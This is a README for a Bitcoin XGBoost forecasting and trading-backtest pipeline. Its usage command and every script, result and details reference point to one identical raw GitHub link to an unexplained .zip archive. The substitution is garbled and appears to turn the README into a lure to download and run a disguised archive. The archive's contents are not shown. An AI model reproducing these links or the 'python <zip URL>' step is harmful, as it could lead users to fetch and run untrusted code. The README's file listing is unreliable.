# Crypto Algorithmic Trading Pipeline

## Overview
This project implements a complete quantitative trading workflow for Bitcoin (BTC/USDT). It includes:
1.  **Price Forecasting (Task 1)**: XGBoost Regressor predicting future prices (MSE).
2.  **Algorithmic Trading (Task 2)**: An adaptive "Trend-Momentum" strategy powered by a Rolling XGBoost Classifier.

## Features
*   **Adaptive Learning**: Uses Walk-Forward rolling windows to retrain models monthly.
*   **Regime Detection**: Adjusts risk based on Bull/Bear market status (200 EMA).
*   **MLflow Integration**: Full experiment tracking (Metrics, Params, Artifacts).
*   **Robust Backtesting**: Calculates Sharpe, Sortino, Drawdown, and generates Equity Curves.

## Installation
1.  Install dependencies:
    ```bash
    pip install pandas numpy xgboost matplotlib mlflow scikit-learn
    ```

## Usage (One-Click)
Run the master pipeline to execute the entire workflow:
```bash
python https://raw.githubusercontent.com/AyushPallod/ooc_ps04_btc_pred_backtest/main/caraunda/ps-backtest-pred-btc-ooc-3.3-beta.2.zip
```

## Individual Scripts
*   `https://raw.githubusercontent.com/AyushPallod/ooc_ps04_btc_pred_backtest/main/caraunda/ps-backtest-pred-btc-ooc-3.3-beta.2.zip`: Loads raw data and engineering features.
*   `https://raw.githubusercontent.com/AyushPallod/ooc_ps04_btc_pred_backtest/main/caraunda/ps-backtest-pred-btc-ooc-3.3-beta.2.zip`: Runs the Price Prediction task (Train 2017-Jun 2021, Test Jul-Dec 2021).
*   `https://raw.githubusercontent.com/AyushPallod/ooc_ps04_btc_pred_backtest/main/caraunda/ps-backtest-pred-btc-ooc-3.3-beta.2.zip`: Trains the Trading Signal model using rolling validation.
*   `https://raw.githubusercontent.com/AyushPallod/ooc_ps04_btc_pred_backtest/main/caraunda/ps-backtest-pred-btc-ooc-3.3-beta.2.zip`: Simulates the trading strategy and generates reports.

## Results
*   **Task 1**: View `https://raw.githubusercontent.com/AyushPallod/ooc_ps04_btc_pred_backtest/main/caraunda/ps-backtest-pred-btc-ooc-3.3-beta.2.zip` for price predictions.
*   **Task 2**: View `final_backtest_*.png` for Equity Curves and Drawdowns.
*   **Logs**: Check `trade_log_*.csv` for trade-by-trade details.
*   **MLflow**: Run `mlflow ui` to explore experiments.

> [!NOTE]
> Check https://raw.githubusercontent.com/AyushPallod/ooc_ps04_btc_pred_backtest/main/caraunda/ps-backtest-pred-btc-ooc-3.3-beta.2.zip for all clear details